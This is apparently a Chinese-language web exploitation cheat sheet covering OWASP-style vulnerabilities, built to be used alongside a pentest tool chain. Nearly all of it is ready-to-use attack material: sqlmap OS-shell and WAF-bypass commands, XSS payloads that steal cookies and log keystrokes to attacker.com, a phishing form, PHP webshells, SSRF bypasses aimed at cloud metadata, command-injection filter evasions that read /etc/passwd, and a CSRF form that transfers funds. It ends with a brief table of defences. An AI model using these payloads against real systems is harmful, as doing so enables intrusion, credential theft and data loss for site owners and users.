# Web 漏洞利用速查

> 覆盖 OWASP Top 10 + 实战高频漏洞。每个漏洞类型包含：原理、检测方法、利用 payload、防御建议。
> 配合 pentest-tools 的 MCP 工具链使用。

---

## SQL 注入

### 检测

```bash
# 基础检测
' OR 1=1--
" OR 1=1--
1' AND '1'='1
1' AND '1'='2    # 对比响应差异

# 时间盲注检测
1' AND SLEEP(5)--
1' AND IF(1=1,SLEEP(5),0)--

# 报错注入检测
1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
```

### SQLMap 自动化

```bash
# 基础扫描
sqlmap -u "http://target/page?id=1" --batch --dbs

# POST 请求
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch

# Cookie 注入
sqlmap -u "http://target/page" --cookie="id=1*" --batch

# 指定注入点
sqlmap -u "http://target/page" --data="a=1&b=2*&c=3" --batch

# 绕过 WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --random-agent

# 获取 shell
sqlmap -u "http://target/page?id=1" --os-shell
```

### 常用 Tamper 脚本

| Tamper | 作用 |
|--------|------|
| `space2comment` | 空格替换为 `/**/` |
| `between` | `>` 替换为 `BETWEEN` |
| `randomcase` | 关键字随机大小写 |
| `charencode` | URL 编码 |
| `equaltolike` | `=` 替换为 `LIKE` |
| `base64encode` | Base64 编码 payload |

---

## XSS（跨站脚本）

### 检测 Payload

```html
<!-- 反射型 -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

<!-- DOM 型 -->
javascript:alert(1)
#<img src=x onerror=alert(1)>

<!-- 存储型 -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- 绕过过滤 -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert(1)">
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

### XSS 利用

```javascript
// Cookie 窃取
new Image().src="https://attacker.com/steal?c="+document.cookie;

// Keylogger
document.onkeypress=function(e){
    new Image().src="https://attacker.com/log?k="+e.key;
}

// 页面劫持
document.body.innerHTML='<h1>Session Expired</h1><form action="https://attacker.com/phish"><input name="user"><input name="pass" type="password"><button>Login</button></form>';
```

---

## SSRF（服务端请求伪造）

### 检测

```text
# 内网探测
http://127.0.0.1:80
http://localhost:22
http://[::1]:80
http://0x7f000001:80

# 云元数据
http://169.254.169.254/latest/meta-data/    (AWS)
http://metadata.google.internal/             (GCP)
http://169.254.169.254/metadata/instance     (Azure)

# 协议利用
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

### 绕过技巧

```text
# IP 绕过
http://0177.0.0.1        (八进制)
http://2130706433        (十进制)
http://0x7f.0x0.0x0.0x1  (十六进制)
http://127.1             (短格式)
http://127.0.0.1.nip.io  (DNS 重绑定)

# URL 绕过
http://attacker.com@127.0.0.1
http://127.0.0.1#@allowed.com
http://127.0.0.1%2523@allowed.com

# 重定向绕过
http://allowed.com/redirect?url=http://127.0.0.1
```

---

## 文件上传漏洞

### 绕过方法

| 检测方式 | 绕过方法 |
|---------|---------|
| 后缀名黑名单 | `.php5`、`.phtml`、`.pHp`、`.php.jpg` |
| Content-Type 检查 | 修改为 `image/jpeg` |
| 文件头检查 | 在 webshell 前加 `GIF89a` |
| 文件大小限制 | 压缩 payload |
| 图片二次渲染 | 在不被修改的区域插入代码 |
| .htaccess 限制 | 上传 `.htaccess` 修改解析规则 |

### Webshell Payload

```php
<?php system($_GET['cmd']); ?>
<?php eval($_POST['x']); ?>
<?=`$_GET[0]`?>

<!-- 图片马 -->
GIF89a<?php system($_GET['cmd']); ?>
```

---

## IDOR（不安全的直接对象引用）

### 测试方法

```bash
# 水平越权
GET /api/users/1001/profile    # 自己的
GET /api/users/1002/profile    # 别人的 → 应该 403

# 垂直越权
GET /api/admin/users           # 普通用户访问管理接口

# 参数篡改
POST /api/orders/cancel {"order_id": "OTHER_USER_ORDER"}

# ID 遍历
for id in $(seq 1 1000); do
    curl -s -H "Auth: TOKEN" "https://api.target.com/users/$id" | grep -v "403"
done
```

### 常见 IDOR 位置

```text
- /api/users/{id}
- /api/orders/{id}
- /api/files/{id}/download
- /api/messages/{id}
- /api/invoices/{id}.pdf
- /profile?user_id=xxx
- /download?file_id=xxx
```

---

## 认证绕过

### JWT 攻击

```bash
# 算法混淆（none）
# Header: {"alg":"none","typ":"JWT"}
# 去掉签名部分

# 密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# RS256 → HS256 降级
# 用公钥作为 HMAC 密钥签名
```

### 密码重置漏洞

```text
□ 重置 token 可预测（时间戳/递增）
□ 重置链接不过期
□ Host 头注入（修改 Host → 重置链接指向攻击者）
□ 验证码可爆破（4-6 位无频率限制）
□ 邮箱/手机号参数可篡改
```

---

## 命令注入

### 检测

```bash
# Linux
; id
| id
`id`
$(id)
; sleep 5
| sleep 5

# Windows
& whoami
| whoami
; dir
`dir`
```

### 绕过

```bash
# 空格绕过
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd

# 关键字绕过
c'a't /etc/passwd
c""at /etc/passwd
/bin/c?t /etc/passwd
```

---

## 目录遍历

### Payload

```text
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/..%c0%af../..%c0%af../etc/passwd
```

### Windows

```text
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

---

## CSRF（跨站请求伪造）

### 检测

```text
□ 关键操作无 CSRF Token
□ Token 不验证（删除 token 参数仍可请求）
□ Token 不绑定会话（A 的 token 可用于 B）
□ Referer 检查可绕过（空 Referer）
□ JSON 请求无 Content-Type 校验
```

### 利用

```html
<!-- 自动提交表单 -->
<form action="https://target.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

<!-- JSON CSRF -->
<script>
fetch('https://target.com/api/change-email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"email":"attacker@evil.com"}'
});
</script>
```

---

## 信息泄露

### 常见泄露点

```bash
# 配置文件
/.env
/config.php.bak
/web.config
/.git/config
/.svn/entries

# 调试信息
/debug
/trace
/actuator/env        (Spring Boot)
/swagger-ui.html     (API 文档)
/__debug__           (Django)

# 备份文件
/backup.sql
/db.sql.gz
/site.tar.gz
/*.bak
```

### FFUF 发现

```bash
# 目录爆破
ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/common.txt

# 参数发现
ffuf -u "https://target.com/api?FUZZ=test" -w /path/to/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# 子域名爆破
ffuf -u https://FUZZ.target.com -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# 虚拟主机发现
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0
```

---

## 防御建议速查

| 漏洞 | 核心防御 |
|------|---------|
| SQL 注入 | 参数化查询（PreparedStatement） |
| XSS | 输出编码 + CSP + HttpOnly Cookie |
| SSRF | 白名单 URL + 禁止内网 IP + 禁止非 HTTP 协议 |
| 文件上传 | 白名单后缀 + 重命名 + 独立存储域 + 文件头校验 |
| IDOR | 服务端鉴权（不信任客户端传的 ID） |
| CSRF | SameSite Cookie + CSRF Token + Referer 校验 |
| 命令注入 | 避免拼接命令 + 白名单参数 + 沙箱执行 |
| 目录遍历 | 规范化路径 + chroot + 白名单文件 |
| JWT | 强密钥 + RS256 + 短过期 + 黑名单 |
